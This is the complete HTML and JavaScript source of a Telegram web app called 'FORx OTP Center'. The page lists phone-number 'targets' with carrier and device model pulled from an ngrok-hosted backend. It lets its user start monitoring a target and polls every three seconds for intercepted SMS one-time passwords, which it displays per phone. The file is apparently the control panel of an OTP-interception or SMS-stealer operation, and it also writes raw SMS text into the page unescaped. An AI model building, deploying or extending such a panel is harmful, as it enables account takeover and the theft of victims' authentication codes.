<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FORx OTP Center</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:sans-serif; margin:0; padding:15px; }
        .tabs { display:flex; gap:5px; margin-bottom:10px; }
        .tab { flex:1; padding:10px; background:#1e1e1e; text-align:center; border-radius:8px 8px 0 0; cursor:pointer; }
        .tab.active { background:#2ecc71; color:#000; }
        .panel { display:none; }
        .panel.active { display:block; }

        .card { background:#1e1e1e; border-radius:10px; padding:12px; margin:8px 0; }
        .card-header { display:flex; justify-content:space-between; align-items:center; }
        .monitor-box {
            margin-top:10px;
            padding:10px;
            background:#2c3e50;
            border-radius:8px;
            display:none;
        }
        .monitor-box.active { display:block; }
        .target-heading {
            font-size:18px; font-weight:bold; margin-bottom:5px;
            display:flex; align-items:center; gap:10px;
        }
        .copy-btn {
            background:#3498db; color:#fff; border:none;
            padding:4px 8px; border-radius:4px; cursor:pointer; font-size:12px;
        }
        .otp-area {
            background:#111; min-height:60px; max-height:200px;
            overflow-y:auto; padding:8px; border-radius:6px; margin:8px 0;
        }
        .otp-line {
            background:#1a1a1a; padding:6px 8px; margin:4px 0;
            border-radius:4px; font-size:13px;
        }
        .btn { background:#2ecc71; color:#000; border:none; padding:8px 14px; border-radius:6px; font-weight:bold; cursor:pointer; }
        .btn.stop { background:#e74c3c; }
        .btn.close { background:#95a5a6; color:#000; margin-top:5px; }
        .fav-btn { background:#f39c12; }
        #feed { height:350px; overflow-y:auto; background:#111; border-radius:8px; padding:8px; }
        input, button { font-size:14px; }
    </style>
</head>
<body>
    <div class="tabs">
        <div class="tab active" onclick="switchTab('targets')">🎯 Targets</div>
        <div class="tab" onclick="switchTab('favourites')">⭐ Favourites</div>
        <div class="tab" onclick="switchTab('feed')">⚡ Live Feed</div>
    </div>

    <div id="targets-panel" class="panel active">
        <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
        <div id="targets-list"></div>
    </div>
    <div id="favourites-panel" class="panel">
        <button onclick="loadFavourites()">🔄 Refresh</button>
        <div id="favourites-list"></div>
    </div>
    <div id="feed-panel" class="panel">
        <div id="feed"><p>No OTPs yet...</p></div>
    </div>

    <script>
        // ========== CONFIG ==========
        const API = 'https://limit-crispness-uncork.ngrok-free.dev';
        const tg = Telegram.WebApp; tg.ready();
        let userId = tg.initDataUnsafe?.user?.id || null;
        if (!userId) {
            const params = new URLSearchParams(window.location.search);
            userId = params.get('user_id');
        }
        if (!userId) {
            document.body.innerHTML = '<p style="color:red;">❌ Could not get user ID. Please open via bot.</p>';
            throw new Error('No user ID');
        }

        const HEADERS = {
            'ngrok-skip-browser-warning': 'true',
            'Content-Type': 'application/json'
        };
        let allTargets = [];
        // Active monitors per device: did -> { active:bool, phone:string, lastTs:number }
        let activeMonitors = {};
        let globalPollInterval = null;
        let globalLastOtpTs = 0;

        // Tab switching
        window.switchTab = (tab) => {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.getElementById(tab+'-panel').classList.add('active');
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            if (tab === 'targets') loadTargets();
            if (tab === 'favourites') loadFavourites();
        };

        // ----- Targets -----
        async function loadTargets() {
            try {
                let res = await fetch(`${API}/api/targets`, { headers: HEADERS });
                if (!res.ok) throw new Error('HTTP ' + res.status);
                allTargets = await res.json();
                renderTargets(allTargets);
            } catch(e) {
                document.getElementById('targets-list').innerHTML = '<p style="color:red;">Failed to load targets.</p>';
            }
        }

        function renderTargets(targets) {
            let html = targets.length ? '' : '<p>No online targets. Scanner may be warming up.</p>';
            targets.forEach(t => {
                let carrier = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
                html += `
                <div class="card" id="card-${t.did}">
                    <div class="card-header">
                        <div>
                            <b>${t.phone1}</b>${carrier}<br>
                            <small>${t.model} | DB-${t.db_index}</small>
                        </div>
                        <div>
                            <button class="btn fav-btn" onclick="toggleFavourite('${t.did}')">⭐</button>
                            <button class="btn" id="monitor-btn-${t.did}" onclick="toggleMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}')">▶️ MONITOR</button>
                        </div>
                    </div>
                    <div class="monitor-box" id="monitor-box-${t.did}">
                        <div class="target-heading">
                            TARGET: ${t.phone1}
                            <button class="copy-btn" onclick="copyText('${t.phone1}')">📋 Copy</button>
                        </div>
                        <div class="otp-area" id="otp-area-${t.did}"></div>
                        <button class="btn close" onclick="closeMonitor('${t.did}')">✖ Close</button>
                    </div>
                </div>`;
            });
            document.getElementById('targets-list').innerHTML = html;
            // Restore any already active monitors
            for (let did in activeMonitors) {
                if (activeMonitors[did].active) {
                    let box = document.getElementById('monitor-box-'+did);
                    let btn = document.getElementById('monitor-btn-'+did);
                    if (box && btn) {
                        box.classList.add('active');
                        btn.innerHTML = '⏹ STOP';
                        btn.classList.add('stop');
                    }
                }
            }
        }

        window.filterTargets = function() {
            let query = document.getElementById('search').value.toLowerCase();
            let filtered = allTargets.filter(t => t.phone1.includes(query));
            renderTargets(filtered);
        };

        // ----- Monitor Toggle -----
        window.toggleMonitor = async function(did, dbIndex, phone, model) {
            let monitor = activeMonitors[did];
            let btn = document.getElementById('monitor-btn-'+did);
            let box = document.getElementById('monitor-box-'+did);

            if (!monitor || !monitor.active) {
                // Start monitoring
                await fetch(`${API}/api/monitor`, {
                    method: 'POST', headers: HEADERS,
                    body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1: phone, model })
                });
                activeMonitors[did] = { active: true, phone: phone, lastTs: 0 };
                if (btn) {
                    btn.innerHTML = '⏹ STOP';
                    btn.classList.add('stop');
                }
                if (box) box.classList.add('active');
                startGlobalPolling();
            } else {
                // Stop monitoring
                await fetch(`${API}/api/monitor`, {
                    method: 'DELETE', headers: HEADERS,
                    body: JSON.stringify({ user_id: userId, did })
                });
                activeMonitors[did].active = false;
                if (btn) {
                    btn.innerHTML = '▶️ MONITOR';
                    btn.classList.remove('stop');
                }
                // Keep box open, just stop updating (user can close manually)
            }
        };

        // Close box completely
        window.closeMonitor = async function(did) {
            if (activeMonitors[did]?.active) {
                await fetch(`${API}/api/monitor`, {
                    method: 'DELETE', headers: HEADERS,
                    body: JSON.stringify({ user_id: userId, did })
                });
            }
            delete activeMonitors[did];
            let box = document.getElementById('monitor-box-'+did);
            let btn = document.getElementById('monitor-btn-'+did);
            if (box) box.classList.remove('active');
            if (btn) {
                btn.innerHTML = '▶️ MONITOR';
                btn.classList.remove('stop');
            }
            document.getElementById('otp-area-'+did).innerHTML = '';
        };

        // ----- Global OTP Polling (runs when any monitor active) -----
        function startGlobalPolling() {
            if (globalPollInterval) return;
            globalPollInterval = setInterval(async () => {
                let activeIds = Object.keys(activeMonitors).filter(did => activeMonitors[did].active);
                if (activeIds.length === 0) {
                    clearInterval(globalPollInterval);
                    globalPollInterval = null;
                    return;
                }
                try {
                    let res = await fetch(`${API}/api/otp/${userId}?since=${globalLastOtpTs}`, { headers: HEADERS });
                    if (!res.ok) return;
                    let msgs = await res.json();
                    if (msgs.length) {
                        globalLastOtpTs = msgs[msgs.length-1].ts;
                        msgs.forEach(m => {
                            // Match phone number in formatted SMS
                            let match = m.text.match(/📟 \*\*SIM:\*\* `(\d+)`/);
                            if (match) {
                                let phone = match[1];
                                for (let did in activeMonitors) {
                                    if (activeMonitors[did].active && activeMonitors[did].phone === phone) {
                                        let area = document.getElementById('otp-area-'+did);
                                        if (area) {
                                            area.innerHTML += `<div class="otp-line">${m.text}</div>`;
                                            area.scrollTop = area.scrollHeight;
                                        }
                                        break;
                                    }
                                }
                            }
                        });
                    }
                } catch(e) {}
            }, 3000);
        }

        // ----- Favourites (simplified, keep existing) -----
        async function loadFavourites() {
            try {
                let res = await fetch(`${API}/api/favourites/${userId}`, { headers: HEADERS });
                if (!res.ok) throw new Error('Failed');
                let favs = await res.json();
                let html = '';
                if (favs.length === 0) html = '<p>No favourites.</p>';
                else {
                    favs.forEach(f => {
                        html += `<div class="card">
                            <div><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
                            <div>
                                <button class="btn" onclick="toggleMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️ MONITOR</button>
                                <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
                            </div>
                        </div>`;
                    });
                }
                document.getElementById('favourites-list').innerHTML = html;
            } catch(e) {
                document.getElementById('favourites-list').innerHTML = '<p style="color:red;">Error loading favourites.</p>';
            }
        }

        window.addFavourite = async function(did, phone1, phone2, car1, car2, model, dbIndex) {
            await fetch(`${API}/api/favourites/${userId}`, {
                method: 'POST', headers: HEADERS,
                body: JSON.stringify({ did, phone1, phone2, carrier1:car1, carrier2:car2, model, db_index:dbIndex })
            });
            tg.showAlert('Added to favourites');
        };

        window.removeFavourite = async function(did) {
            await fetch(`${API}/api/favourites/${userId}`, {
                method: 'DELETE', headers: HEADERS,
                body: JSON.stringify({ did })
            });
            loadFavourites();
        };

        // Copy helper
        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => tg.showAlert('Copied!'));
        }

        // Initial load
        loadTargets();
        setInterval(loadTargets, 30000);
    </script>
</body>
</html>
